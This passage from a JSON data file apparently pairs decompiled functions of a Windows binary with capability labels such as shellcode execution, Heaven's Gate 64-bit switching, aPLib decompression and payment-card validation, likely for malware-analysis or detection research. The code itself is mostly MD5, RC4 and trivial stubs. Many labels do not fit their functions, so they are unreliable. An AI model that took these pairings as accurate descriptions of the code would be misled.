        "decompiled_code": "\nulong __cdecl fcn.00402efd(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_4h;\n    \n    var_4h = arg_10h;\n    do {\n        uVar4 = arg_8h[1];\n        uVar2 = arg_8h[2];\n        uVar3 = arg_8h[3];\n        uVar1 = ((uVar2 ^ uVar3) & uVar4 ^ uVar3) + 0xd76aa478 + *arg_8h + *arg_ch;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar4;\n        uVar3 = ((uVar4 ^ uVar2) & uVar1 ^ uVar2) + 0xe8c7b756 + uVar3 + arg_ch[1];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n        uVar2 = ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + 0x242070db + uVar2 + arg_ch[2];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar4 = ((uVar3 ^ uVar1) & uVar2 ^ uVar1) + 0xc1bdceee + uVar4 + arg_ch[3];\n        uVar5 = (uVar4 * 0x400000 | uVar4 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar5 ^ uVar3) + 0xf57c0faf + uVar1 + arg_ch[4];\n        uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar5;\n        uVar3 = ((uVar5 ^ uVar2) & uVar4 ^ uVar2) + 0x4787c62a + uVar3 + arg_ch[5];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = ((uVar4 ^ uVar5) & uVar3 ^ uVar5) + 0xa8304613 + uVar2 + arg_ch[6];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0xfd469501 + uVar5 + arg_ch[7];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar1 ^ uVar3) + 0x698098d8 + uVar4 + arg_ch[8];\n        uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n        uVar3 = ((uVar1 ^ uVar2) & uVar4 ^ uVar2) + 0x8b44f7af + uVar3 + arg_ch[9];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = (((uVar4 ^ uVar1) & uVar3 ^ uVar1) - 0xa44f) + uVar2 + arg_ch[10];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x895cd7be + uVar1 + arg_ch[0xb];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar1 ^ uVar3) + 0x6b901122 + uVar4 + arg_ch[0xc];\n        uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n        uVar3 = ((uVar1 ^ uVar2) & uVar4 ^ uVar2) + 0xfd987193 + uVar3 + arg_ch[0xd];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = ((uVar4 ^ uVar1) & uVar3 ^ uVar1) + 0xa679438e + uVar2 + arg_ch[0xe];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x49b40821 + uVar1 + arg_ch[0xf];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xf61e2562 + uVar4 + arg_ch[1];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xc040b340 + uVar3 + arg_ch[6];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0x265e5a51 + uVar2 + arg_ch[0xb];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0xe9b6c7aa + uVar1 + *arg_ch;\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xd62f105d + uVar4 + arg_ch[5];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0x2441453 + uVar3 + arg_ch[10];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0xd8a1e681 + uVar2 + arg_ch[0xf];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0xe7d3fbc8 + uVar1 + arg_ch[4];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0x21e1cde6 + uVar4 + arg_ch[9];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xc33707d6 + uVar3 + arg_ch[0xe];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0xf4d50d87 + uVar2 + arg_ch[3];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0x455a14ed + uVar1 + arg_ch[8];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xa9e3e905 + uVar4 + arg_ch[0xd];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xfcefa3f8 + uVar3 + arg_ch[2];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0x676f02d9 + uVar2 + arg_ch[7];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0x8d2a4c8a + uVar1 + arg_ch[0xc];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3 ^ uVar1) - 0x5c6be) + uVar4 + arg_ch[5];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0x8771f681 + uVar3 + arg_ch[8];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0x6d9d6122 + uVar2 + arg_ch[0xb];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xfde5380c + uVar1 + arg_ch[0xe];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0xa4beea44 + uVar4 + arg_ch[1];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0x4bdecfa9 + uVar3 + arg_ch[4];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0xf6bb4b60 + uVar2 + arg_ch[7];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xbebfbc70 + uVar1 + arg_ch[10];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0x289b7ec6 + uVar4 + arg_ch[0xd];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0xeaa127fa + uVar3 + *arg_ch;\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0xd4ef3085 + uVar2 + arg_ch[3];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0x4881d05 + uVar1 + arg_ch[6];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0xd9d4d039 + uVar4 + arg_ch[9];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0xe6db99e5 + uVar3 + arg_ch[0xc];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0x1fa27cf8 + uVar2 + arg_ch[0xf];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xc4ac5665 + uVar1 + arg_ch[2];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0xf4292244 + uVar4 + *arg_ch;\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0x432aff97 + uVar3 + arg_ch[7];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0xab9423a7 + uVar2 + arg_ch[0xe];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0xfc93a039 + uVar1 + arg_ch[5];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0x655b59c3 + uVar4 + arg_ch[0xc];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0x8f0ccc92 + uVar3 + arg_ch[3];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = (((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) - 0x100b83) + uVar2 + arg_ch[10];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0x85845dd1 + uVar1 + arg_ch[1];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0x6fa87e4f + uVar4 + arg_ch[8];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0xfe2ce6e0 + uVar3 + arg_ch[0xf];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0xa3014314 + uVar2 + arg_ch[6];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0x4e0811a1 + uVar1 + arg_ch[0xd];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0xf7537e82 + uVar4 + arg_ch[4];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0xbd3af235 + uVar3 + arg_ch[0xb];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0x2ad7d2bb + uVar2 + arg_ch[2];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0xeb86d391 + uVar1 + arg_ch[9];\n        *arg_8h = *arg_8h + uVar4;\n        arg_8h[1] = arg_8h[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        arg_8h[2] = arg_8h[2] + uVar2;\n        arg_8h[3] = arg_8h[3] + uVar3;\n        var_4h = var_4h + -1;\n        arg_ch = arg_ch + 0x10;\n    } while (-1 < var_4h);\n    return CONCAT44(in_EDX, in_EAX);\n}\n",
        "token_count": 4725
    },
    "00411e98": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00411e98(uint32_t param_1)\n\n{\n    return param_1 + 0x40 + (param_1 >> 3);\n}\n",
        "token_count": 39
    },
    "00410dfa": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00410dfa(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0x80) && (param_3 < 4)) {\n        if (param_2 != *(param_1 + 0x424)) {\n            return (-(param_2 != 0) & 6) + 5;\n        }\n    }\n    else if (param_2 != *(param_1 + 0x424)) {\n        if (param_2 < 0x80) {\n            param_3 = param_3 - 2;\n        }\n        else {\n            if (0x4ff < param_2) {\n                param_3 = param_3 - 1;\n            }\n            if (31999 < param_2) {\n                param_3 = param_3 - 1;\n            }\n        }\n        iVar2 = fcn.00410880((param_2 >> 8) + 3);\n        iVar1 = fcn.00410880(param_3);\n        return iVar1 + 10 + iVar2;\n    }\n    iVar2 = fcn.00410880(param_3);\n    return iVar2 + 4;\n}\n",
        "token_count": 288
    },
    "00412131": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.00412131(uint8_t *param_1, uint32_t *param_2)\n\n{\n    uint32_t *puVar1;\n    \n    *param_2 = *param_1 << 0x18;\n    *param_2 = param_1[1] << 0x10 | *param_2;\n    *param_2 = param_1[2] << 8 | *param_2;\n    puVar1 = param_2 + 1;\n    *param_2 = *param_2 | param_1[3];\n    *puVar1 = param_1[4] << 0x18;\n    *puVar1 = param_1[5] << 0x10 | *puVar1;\n    *puVar1 = param_1[6] << 8 | *puVar1 | param_1[7];\n    return;\n}\n",
        "token_count": 196
    },
    "0040c1ff": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c1ff(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x33, 0);\n    fcn.0040c13d(arg_8h, 0x416543);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0041219a": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0041219a(uint *param_1, uchar *param_2)\n\n{\n    uint *puVar1;\n    \n    *param_2 = *param_1 >> 0x18;\n    param_2[1] = *param_1 >> 0x10;\n    param_2[2] = *param_1 >> 8;\n    puVar1 = param_1 + 1;\n    param_2[3] = *param_1;\n    param_2[4] = *puVar1 >> 0x18;\n    param_2[5] = *puVar1 >> 0x10;\n    param_2[6] = *puVar1 >> 8;\n    param_2[7] = *puVar1;\n    return;\n}\n",
        "token_count": 174
    },
    "00401047": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040105a)\n\nvoid fcn.00401047(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "00401082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401095)\n\nuint fcn.00401082(void)\n\n{\n    uint in_EAX;\n    \n    return in_EAX;\n}\n",
        "token_count": 40
    },
    "004010c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004010d5)\n// WARNING: Removing unreachable block (ram,0x00401124)\n// WARNING: Removing unreachable block (ram,0x0040112a)\n\nuint fcn.004010c2(void)\n\n{\n    uint in_EAX;\n    \n    return in_EAX;\n}\n",
        "token_count": 73
    },
    "00401133": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401146)\n\nvoid fcn.00401133(void)\n\n{\n    return;\n}\n",
        "token_count": 40
    },
    "0040120d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401223)\n\nvoid fcn.0040120d(void)\n\n{\n    return;\n}\n",
        "token_count": 31
    },
    "004012dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004012ef)\n\nvoid fcn.004012dc(void)\n\n{\n    return;\n}\n",
        "token_count": 40
    },
    "004014e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004014e6(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = arg_ch;\n    uVar1 = fcn.00401082(arg_ch);\n    fcn.004012bb(arg_ch, piVar2, uVar1, 0);\n    (**(*arg_ch + 0x1c))(arg_ch, arg_8h, uVar1, 0, 0, 0);\n    return;\n}\n",
        "token_count": 167
    },
    "00401522": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401522(int32_t *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    (**(*arg_8h + 0x14))(arg_8h, 0, 0, 1, &var_8h);\n    return var_8h;\n}\n",
        "token_count": 94
    },
    "00401636": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401636(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00401082(arg_8h);\n    fcn.00401047(arg_8h, arg_ch + 8, 0);\n    fcn.00401569(arg_8h, iVar1 - arg_ch);\n    fcn.0040129a(arg_8h);\n    return iVar1 - arg_ch;\n}\n",
        "token_count": 116
    },
    "00401675": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401675(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar1) {\n        arg_10h = fcn.00401082(arg_8h);\n        iVar1 = fcn.00410670(var_4h);\n        if (iVar1 != 0) {\n            var_ch = fcn.00401dc6(0, iVar1, arg_10h);\n            fcn.00410676(var_4h);\n        }\n    }\n    fcn.0040129a(arg_8h);\n    fcn.00401569(arg_8h, ~(var_ch >> 0x18 | (var_ch & 0xff0000) >> 8 | (var_ch & 0xff00) << 8 | var_ch << 0x18));\n    return;\n}\n",
        "token_count": 243
    },
    "00401788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401788(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar1) {\n        arg_ch_00 = fcn.00401082(arg_8h);\n        iVar1 = fcn.00410670(var_4h);\n        if (iVar1 != 0) {\n            fcn.00402497(iVar1, arg_ch_00, arg_ch);\n            fcn.00410676(var_4h);\n        }\n    }\n    fcn.0040129a(arg_8h);\n    return;\n}\n",
        "token_count": 174
    },
    "004017d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004017d5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint arg_10h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar1) {\n        arg_ch = fcn.00401082(arg_8h);\n        iVar1 = fcn.00410670(var_4h);\n        if (iVar1 != 0) {\n            iVar2 = fcn.00411e92(arg_ch);\n            arg_8h_00 = fcn.004018cf(iVar2 + 0x500000);\n            iVar2 = fcn.00411e98(arg_ch);\n            arg_ch_00 = fcn.004018cf(iVar2 + 0x100000);\n            arg_10h = fcn.00411ea6(iVar1, arg_ch_00, arg_ch, arg_8h_00, 0);\n            fcn.00410676(var_4h);\n            fcn.0040131f(arg_8h);\n            uVar3 = fcn.0040157e(arg_8h, 0x4147c7, 8);\n            uVar4 = fcn.00401569(arg_8h, arg_ch);\n            uVar5 = fcn.0040159f(arg_8h, arg_ch_00, arg_10h);\n            uVar5 = uVar3 & uVar4 & uVar5;\n            fcn.004018b8(arg_8h_00);\n            fcn.004018b8(arg_ch_00);\n        }\n    }\n    fcn.0040129a(arg_8h);\n    return uVar5;\n}\n",
        "token_count": 482
    },
    "004018cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018cf(int32_t arg_8h)\n\n{\n    fcn.00410682(0x40, arg_8h + 0x80);\n    return;\n}\n",
        "token_count": 45
    },
    "0040193f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040193f(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_2h;\n    \n    fcn.004018e6(arg_8h, 0x102);\n    uVar4 = 0;\n    iVar2 = 0x100;\n    do {\n        *(uVar4 + arg_8h + 2) = uVar4;\n        uVar4 = uVar4 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    arg_8h = arg_8h + 2;\n    var_2h._0_1_ = 0;\n    uVar3 = 0;\n    uVar4 = 0;\n    do {\n        cVar1 = *(uVar4 + arg_8h);\n        var_2h._0_1_ = var_2h + cVar1 + *(uVar3 + arg_ch);\n        *(uVar4 + arg_8h) = *(var_2h + arg_8h);\n        *(var_2h + arg_8h) = cVar1;\n        uVar3 = uVar3 + 1;\n        if (arg_10h <= uVar3) {\n            uVar3 = 0;\n        }\n        uVar5 = uVar4 + 1;\n        uVar4 = uVar5;\n    } while (uVar5 != 0);\n    return;\n}\n",
        "token_count": 395
    },
    "004019aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004019aa(uint8_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t var_8h;\n    uint8_t var_4h;\n    uint var_3h;\n    \n    var_3h._0_1_ = *arg_8h;\n    var_4h = arg_8h[1];\n    var_8h = 0;\n    if (arg_10h != 0) {\n        do {\n            var_3h._0_1_ = var_3h + 1;\n            uVar2 = arg_8h[var_3h + 2];\n            var_4h = var_4h + uVar2;\n            uVar1 = arg_8h[var_4h + 2];\n            arg_8h[var_3h + 2] = uVar1;\n            arg_8h[var_4h + 2] = uVar2;\n            *(var_8h + arg_ch) = *(var_8h + arg_ch) ^ arg_8h[(uVar2 + uVar1) + 2];\n            var_8h = var_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    *arg_8h = var_3h;\n    arg_8h[1] = var_4h;\n    return;\n}\n",
        "token_count": 370
    },
    "00401a27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401a27(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_112h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = 0;\n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar1) {\n        var_ch = fcn.00401082(arg_8h);\n        iVar1 = fcn.00410670(var_4h);\n        if (iVar1 != 0) {\n            var_10h = iVar1;\n            var_8h = fcn.004018cf(var_ch);\n            fcn.00401906(var_10h, var_8h, var_ch);\n            fcn.00410676(var_4h);\n            arg_10h = fcn.0041066a(arg_ch);\n            fcn.0040193f(&var_112h, arg_ch, arg_10h);\n            fcn.004019aa(&var_112h, var_8h, var_ch);\n            fcn.0040131f(arg_8h);\n            uVar3 = fcn.0040157e(arg_8h, 0x4147d2, 8);\n            uVar2 = fcn.0040157e(arg_8h, var_8h, var_ch);\n            uVar3 = uVar3 & uVar2;\n            fcn.004018b8(var_8h);\n        }\n    }\n    fcn.0040129a(arg_8h);\n    return uVar3;\n}\n",
        "token_count": 399
    },
    "00401aec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401aec(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00410688();\n    var_118h = ~(uVar1 << 0xb | uVar1 >> 0x15);\n    uVar1 = 0;\n    iVar2 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar2) {\n        var_ch = fcn.00401082(arg_8h);\n        iVar2 = fcn.00410670(var_4h);\n        if (iVar2 != 0) {\n            var_10h = iVar2;\n            var_8h = fcn.004018cf(var_ch);\n            fcn.00401906(var_10h, var_8h, var_ch);\n            fcn.00410676(var_4h);\n            fcn.0040193f(&var_112h, &var_118h, 4);\n            fcn.004019aa(&var_112h, var_8h, var_ch);\n            fcn.0040131f(arg_8h);\n            uVar1 = fcn.0040157e(arg_8h, &var_118h, 4);\n            uVar3 = fcn.0040157e(arg_8h, var_8h, var_ch);\n            uVar1 = uVar1 & uVar3;\n            fcn.004018b8(var_8h);\n        }\n    }\n    fcn.0040129a(arg_8h);\n    return uVar1;\n}\n",
        "token_count": 415
    },
    "00401fb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
